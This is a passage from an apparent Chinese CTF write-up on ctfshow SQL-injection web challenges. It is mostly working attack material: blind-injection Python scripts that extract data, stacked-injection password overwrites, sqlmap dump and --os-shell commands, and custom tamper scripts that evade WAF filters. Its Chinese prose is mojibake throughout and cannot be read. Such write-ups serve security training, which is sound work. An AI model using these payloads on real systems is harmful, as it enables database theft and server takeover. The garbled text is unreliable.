punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>191</strong></p><p>è¿‡æ»¤äº†file|into|asciiä¸Šä¸ªè„šæœ¬è¿˜èƒ½ç”¨</p><p><strong>192</strong></p><p>è¿‡æ»¤äº†file|into|ascii|ord|hexç»§ç»­ç”¨</p><p><strong>193</strong></p><p>è¿‡æ»¤äº†file|into|ascii|ord|hex|substré—®é¢˜ä¸å¤§ï¼Œæ¢left</p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_flxgcolumn:f1ag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">r",&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;_"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and (left((select f1ag from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">')#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"ç”¨æˆ·åä¸å­˜åœ¨"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>194</strong></p><p>æˆ‘è°¢è°¢ä½ å•Šleftå’Œrightéƒ½æ²¡äº†</p><p>è¿‡æ»¤äº†file|into|ascii|ord|hex|substr|char|left|right|substringï¼Œç”¨likeæˆ–è€…æ­£åˆ™ï¼ˆå…¶å®ç”¨midä¹Ÿè¡Œï¼‰</p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_flxgcolumn:f1ag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;_,"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">')),1,0)#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"ç”¨æˆ·åä¸å­˜åœ¨"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>195</strong></p><p>å †å æ”¹å¯†ç å’¯ï¼ŒæŸ¥è¯¢è¯­å¥ä¸­çš„usernameæ²¡æœ‰ç”¨å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥æŸ¥è¯¢çš„æ—¶å€™ç”¨åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²</p><pre class="line-numbers language-none"><code class="language-none">1;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;0x313131;10x61646d696e111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>196</strong></p><p>ğŸ˜…</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-10">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-10</a> 11.29.32.png)</p><p><strong>197ï¼Œ198</strong></p><p>ä¸€ä¸ªwpè„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ç™»é™†æˆåŠŸ"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘é€‰ç¦»è°±æ–¹æ³•ï¼š</p><pre class="line-numbers language-none"><code class="language-none"># @Author:Y4tacker# username&#x3D;0;show tables;# pass&#x3D;ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>199ï¼Œ200</strong></p><p>åªæœ‰ç¦»è°±æ–¹æ³•èƒ½ç”¨äº†</p><p><strong>201</strong></p><p>sqlmapä½¿ç”¨å¼€å§‹</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;æŸ¥åº“sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --dbs&#x2F;&#x2F;æŸ¥è¡¨sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables&#x2F;&#x2F;æŸ¥å­—æ®µ sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns&#x2F;&#x2F;æŸ¥å€¼sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>202</strong></p><p>ä½¿ç”¨POSTè¯·æ±‚ï¼Œæ·»åŠ â€“dataå‚æ•°æ¥è®¾ç½®</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show&#x2F;api&#x2F; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>203</strong></p><p>è°ƒæ•´è¯·æ±‚æ–¹å¼ï¼Œæ­¤å¤„è°ƒæ•´ä¸ºPUTè¯·æ±‚ï¼Œè®°å¾—åŠ ä¸ŠContent-Typeä¸ç„¶ä¼šå˜è¡¨å•æäº¤</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show&#x2F;api&#x2F;index.php --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>204</strong></p><p>åŠ ä¸Šcookieï¼Œç”¨â€“cookie</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show&#x2F;api&#x2F;index.php --cookie&#x3D;&quot;UM_distinctid&#x3D;17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID&#x3D;honuvgjau5711m3j9tn84hloip; ctfshow&#x3D;2e0d6ee1573392a73c0cca1476342faa&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>205</strong></p><p>æç¤ºapié‰´æƒï¼Œå‘ç°è¯·æ±‚å‰ä¼šå…ˆå¯¹ä¸€ä¸ªurlè¿›è¡Œè°ƒç”¨</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-10">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-10</a> 21.53.17.png)</p><p>ä½¿ç”¨å¦‚ä¸‹ä¸¤ä¸ªå‚æ•°</p><pre class="line-numbers language-none"><code class="language-none">--safe-url è®¾ç½®åœ¨æµ‹è¯•ç›®æ ‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥--safe-freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ€ç»ˆå‘½ä»¤<del>æ‚„æ‚„æ¢è¡¨åå’Œåˆ—åçœŸçš„å¯æ¶</del></p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show&#x2F;api&#x2F;index.php --safe-url&#x3D;&quot;http:&#x2F;&#x2F;685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_flaxc -C flagv --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>206</strong></p><p>æç¤ºSQLéœ€è¦é—­åˆï¼Œ<del>å½“æˆ‘sqlmapå‚»æ˜¯å§</del>ï¼ŒåŒä¸Šå³å¯</p><p><strong>207</strong></p><p>â€“tamper çš„åˆä½“éªŒ</p><p><a href="https://blog.csdn.net/whatday/article/details/54774043">tamperæ€»ç»“</a></p><p>ä½¿ç”¨SQLMapæä¾›çš„tamperè„šæœ¬ï¼Œå¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å¼€åº”ç”¨ç¨‹åºçš„æ•æ„Ÿå­—ç¬¦è¿‡æ»¤ã€ç»•è¿‡WAFè§„åˆ™çš„é˜»æŒ¡ï¼Œç»§è€Œè¿›è¡Œæ¸—é€æ”»å‡»ï¼Œâ€“tamper=TAMPER åˆ©ç”¨ç»™å®šçš„è„šæœ¬è¿›è¡Œç¯¡æ”¹æ³¨å…¥æ•°æ®ï¼Œè¯¥é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨è‡ªå¸¦çš„space2comment.pyå³å¯ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show&#x2F;api&#x2F;index.php --safe-url&#x3D;&quot;http:&#x2F;&#x2F;894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper&#x3D;&quot;space2comment.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>208</strong></p><p>è¿‡æ»¤äº†å°å†™çš„selectï¼Œä½†æ˜¯sqlmapä¸­æ‰€æœ‰SELECTéƒ½æ˜¯å¤§å†™ï¼ŒåŒä¸Šå³å¯</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show&#x2F;api&#x2F;index.php --safe-url&#x3D;&quot;http:&#x2F;&#x2F;d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper&#x3D;&quot;space2comment.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>209</strong></p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œ*å’Œ=ï¼Œè®²é“ç†ä½¿ç”¨bluecoat.pyå°±è¡Œï¼Œä½†æ˜¯å‡ºä¸æ¥ï¼Œåªèƒ½è‡ªå·±ç¼–å†™è„šæœ¬æ›¿æ¢äº†ï¼Œå°†ç©ºæ ¼ç”¨%09æ›¿æ¢ï¼Œ=ç”¨LIKEæ›¿æ¢</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#web209.py</span><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>210</strong></p><p>å¯¹å­—ç¬¦ä¸²è¿›è¡Œbase64è§£ç åè½¬å†è§£ç ï¼Œé‚£å°±ç¼–ç åè½¬å†ç¼–ç </p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#web210.py</span><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal<span class="token operator">=</span>retVal<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        retVal<span class="token operator">=</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        retVal<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span>        retVal<span class="token operator">=</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        retVal<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>211</strong></p><p>ç›¸æ¯”äºä¸Šé¢˜å¤šè¿‡æ»¤äº†ç©ºæ ¼ï¼ŒåŠ ä¸Šspace2commitè„šæœ¬å³å¯</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables --dump --batch --tamper&#x3D;&quot;space2commit.py,web210.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>212</strong></p><p>å‰ä¸¤ä¸ªåŠ èµ·æ¥</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables --dump --batch --tamper&#x3D;&quot;web209.py,web210.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>213</strong></p><p>ä¸€é”®getshellï¼Œâ€“os-shell</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables --os-shell --dump --batch --tamper&#x3D;&quot;web209.py,web210.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>214</strong></p><p>æ—¶é—´ç›²æ³¨å¼€å§‹</p><p>é¦–é¡µå‘ç°ç½‘ç»œæµé‡ä¸­æœ‰select.jsï¼ŒæŸ¥çœ‹ä»£ç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">layui<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'element'</span><span class="token 